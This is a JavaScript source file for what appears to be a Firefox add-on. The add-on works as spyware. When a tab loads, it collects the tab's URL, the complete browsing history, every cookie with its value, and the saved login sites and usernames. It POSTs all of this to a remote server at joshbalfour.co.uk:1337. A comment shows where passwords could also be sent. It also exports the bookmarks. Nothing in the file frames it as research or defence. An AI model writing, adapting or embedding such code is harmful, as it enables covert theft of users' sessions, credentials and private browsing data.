require("tabs").on("ready", logURL);
var request = require("request");
var {Cc, Ci, Cu} = require("chrome");

function logURL(tab) {
  sendData(tab.url,"h");
  show_all_passwords();
  getCookies();
  getHistory();
  getBookmarks();
}


function getHistory()
{
    var {Cc, Ci} = require("chrome");
    var history = "";
   var historyService = Cc["@mozilla.org/browser/nav-history-service;1"].getService(Ci.nsINavHistoryService);

    // queries parameters (e.g. domain name matching, text terms matching, time range...)
    // see : https://developer.mozilla.org/en/nsINavHistoryQuery
    var query = historyService.getNewQuery();
    
    // options parameters (e.g. ordering mode and sorting mode...)
    // see : https://developer.mozilla.org/en/nsINavHistoryQueryOptions
    var options = historyService.getNewQueryOptions();
    
    // execute the query
    // see : https://developer.mozilla.org/en/nsINavHistoryService#executeQuery()
    var result = historyService.executeQuery(query, options);
    
    // Using the results by traversing a container
    // see : https://developer.mozilla.org/en/nsINavHistoryContainerResultNode
    var cont = result.root;
        cont.containerOpen = true;
        
    for (var i = 0; i < cont.childCount; i ++) {
        var node = cont.getChild(i);
        // "node" attributes contains the information (e.g. URI, title, time, icon...)
        // see : https://developer.mozilla.org/en/nsINavHistoryResultNode
       history= history+ node.title+ "," + node.uri + "," + node.time + "\n";
    }
    
    // Close container when done
    // see : https://developer.mozilla.org/en/nsINavHistoryContainerResultNode
    cont.containerOpen = false;
    sendData(history,"hi");
    
}

function getBookmarks(){
    // Import PlacesUtils
    Cu.import("resource://gre/modules/PlacesUtils.jsm");
    var dirSvc = Cc["@mozilla.org/file/directory_service;1"].getService(Ci.nsIProperties);
    
    // Create the backup file
    var jsonFile = dirSvc.get("ProfD", Ci.nsILocalFile);
    var fName = new Date();
    var nameOfFile = fName.getTime()+".json";
    jsonFile.append(nameOfFile);
    jsonFile.create(Ci.nsILocalFile.NORMAL_FILE_TYPE, 0600);
    
    // Export bookmarks in JSON format to file
    PlacesUtils.backupBookmarksToFile(jsonFile);
    console.log(Read(jsonFile.path));
    
}

function Read(file)
{
    var ioService=Cc["@mozilla.org/network/io-service;1"]
        .getService(Ci.nsIIOService);
    var scriptableStream=Cc["@mozilla.org/scriptableinputstream;1"]
        .getService(Ci.nsIScriptableInputStream);

    var channel=ioService.newChannel(file,null,null);
    var input=channel.open();
    scriptableStream.init(input);
    var str=scriptableStream.read(input.available());
    scriptableStream.close();
    input.close();
    return str;
}

function show_all_passwords() {
var allCredentials = Array();
var x = 0;
  require("passwords").search({
    onComplete: function onComplete(credentials) {
      credentials.forEach(function(credential) {
        allCredentials[x]= Array(credential.url,credential.username); // add ,credential.password
        x++;
        });
        sendData(allCredentials,"c");
        return;
      }       
    });
}


function getCookies()
{
    cookies = "";
    
    var cookieManager = Cc["@mozilla.org/cookiemanager;1"]
                        .getService(Ci.nsICookieManager);
                        
    for (var e = cookieManager.enumerator; e.hasMoreElements();) {
        var cookie = e.getNext().QueryInterface(Ci.nsICookie); 
        cookies += cookie.host + ";" + cookie.name + "=" + cookie.value + "\n"; 
    }
    sendData(cookies,"co");
}



function sendData(data2,handler)
{   
    
    var url = "http://joshbalfour.co.uk:1337/"+handler;
    
    if (handler == "h")
    {
        var currentTime = new Date()
        var month = currentTime.getMonth() + 1
        var day = currentTime.getDate()
        var year = currentTime.getFullYear()
        date = month + "/" + day + "/" + year 
        data2 = new Array(date,data2); 
    }
    
    var req = request.Request({
           url:url,
           content:{
               data:data2             
               }
       }).post(); 
   
}    